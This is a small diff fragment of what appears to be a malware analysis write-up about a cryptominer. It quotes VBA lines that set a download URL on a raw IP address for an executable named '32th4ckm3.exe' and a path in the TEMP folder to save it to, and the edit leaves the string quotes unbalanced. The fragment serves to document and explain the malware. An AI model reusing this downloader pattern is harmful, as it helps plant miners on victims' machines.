@@ -121,8 +121,10 @@ End Sub
 
 ```
 
+-------------------------Analysis-----------------------------------
 
-strURL = "http://172.233.61.246/32th4ckm3.exe"
+strURL = "http://172.233.61.246/32th4ckm3.exe
+
 strFilePath = Environ("TEMP") & "\32th4ckm3.exe
 
 they both contain the name of the executable that we have identified as the miner sucking the machine's CPU resources.
